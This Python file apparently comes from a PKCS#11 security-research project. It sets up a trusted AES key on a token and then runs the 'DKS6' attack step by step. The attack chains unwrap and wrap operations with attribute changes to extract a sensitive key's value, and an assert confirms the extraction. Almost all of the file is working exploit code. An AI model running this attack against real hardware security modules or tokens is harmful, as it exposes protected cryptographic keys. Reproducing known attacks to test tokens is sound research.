import secrets

from Crypto.Cipher import AES, PKCS1_v1_5
from PyKCS11 import Session, PyKCS11Lib, MechanismAESGENERATEKEY, MechanismRSAGENERATEKEYPAIR, MechanismRSAPKCS1, \
    Mechanism
from PyKCS11.LowLevel import *

from pkcs11_learning.pykcs11_adapt.pykcs11_utils import convert_handle_of_public_key_to_rsa_key


def create_trusted_key(lib: PyKCS11Lib, so: str, slot: int, pin: str):
    """
    Creates the trusted key, and overwrites the previous if it already exists.
    """
    lib.load(so)
    session = lib.openSession(slot, CKF_RW_SESSION)
    session.login(pin, CKU_SO)

    existing = session.findObjects([(CKA_LABEL, "dks6")])
    if len(existing) > 0:
        session.destroyObject(existing[0])

    template = [
        (CKA_LABEL, "dks6"),
        (CKA_VALUE_LEN, 16),
        (CKA_EXTRACTABLE, CK_TRUE),
        (CKA_TRUSTED, CK_TRUE),
        (CKA_PRIVATE, CK_FALSE),
        (CKA_TOKEN, CK_TRUE),
        (CKA_WRAP, CK_FALSE),
        (CKA_UNWRAP, CK_FALSE),
        (CKA_ENCRYPT, CK_FALSE),
        (CKA_DECRYPT, CK_FALSE),
    ]
    session.generateKey(template, MechanismAESGENERATEKEY)

    session.logout()
    session.closeSession()


def dks_6_attack_aes_ecb_rsa_pkcs(session: Session):
    """
    The intruder knows the handles h(n1, k1), h(n2, k2) and the key k3;
    n1 has the attributes sensitive, extract and wrap with trusted whereas n2 has the attributes extract and trusted set.
    The intruder also knows the public key pub(s1) and its associated handle h(n3, priv(s1));
    n3 has the attribute unwrap set.
    """
    k1 = secrets.token_bytes(16)
    n1_template = [
        (CKA_CLASS, CKO_SECRET_KEY),
        (CKA_KEY_TYPE, CKK_AES),
        (CKA_VALUE, k1),
        (CKA_SENSITIVE, CK_TRUE),
        (CKA_EXTRACTABLE, CK_TRUE),
        (CKA_WRAP_WITH_TRUSTED, CK_TRUE),
        (CKA_WRAP, CK_FALSE),
        (CKA_UNWRAP, CK_FALSE),
        (CKA_ENCRYPT, CK_FALSE),
        (CKA_DECRYPT, CK_FALSE),
    ]
    n1 = session.createObject(n1_template)

    n2_template = [
        (CKA_LABEL, "dks6"),
    ]
    n2_list = session.findObjects(n2_template)
    if len(n2_list) == 0:
        print("trusted key with label 'dks6' not found")
        return
    n2 = n2_list[0]

    k3 = secrets.token_bytes(16)

    public_template = [
        (CKA_MODULUS_BITS, 512 * 8)
    ]
    private_template = [
        (CKA_UNWRAP, CK_TRUE),
    ]
    pub, n3 = session.generateKeyPair(public_template, private_template, MechanismRSAGENERATEKEYPAIR)

    pub = convert_handle_of_public_key_to_rsa_key(session, pub)

    # Intruder: k3, pub(s1) → aenc(k3, pub(s1))
    cipher = PKCS1_v1_5.new(pub)
    k3_s1 = cipher.encrypt(k3)

    # Set_unwrap: h(n3, priv(s1)) → unwrap(n3)
    session.setAttributeValue(n3, [(CKA_UNWRAP, CK_TRUE)])

    # Unwrap: h(n3, priv(s1)), aenc(k3, pub(s1)) → h(n4, k3)
    template = [
        (CKA_CLASS, CKO_SECRET_KEY),
        (CKA_KEY_TYPE, CKK_AES),
    ]
    n4 = session.unwrapKey(n3, k3_s1, template, MechanismRSAPKCS1)

    # Set_wrap: h(n4, k3) → wrap(n4)
    session.setAttributeValue(n4, [(CKA_WRAP, CK_TRUE)])

    # Wrap: h(n4, k3), h(n2, k2) → senc(k2, k3)
    k2_k3 = session.wrapKey(n4, n2, Mechanism(CKM_AES_ECB))

    # Intruder: senc(k2, k3), k3 → k2
    decipher = AES.new(k3, AES.MODE_ECB)
    k2 = decipher.decrypt(bytes(k2_k3))

    # Set_wrap: h(n2, k2) → wrap(n2)
    session.setAttributeValue(n2, [(CKA_WRAP, CK_TRUE)])

    # Wrap: h(n2, k2), h(n1, k1) → senc(k1, k2)
    k1_k2 = session.wrapKey(n2, n1, Mechanism(CKM_AES_ECB))

    # Intruder: senc(k1, k2), k2 → k1
    decipher = AES.new(k2, AES.MODE_ECB)
    recovered = decipher.decrypt(bytes(k1_k2))

    assert k1 == recovered
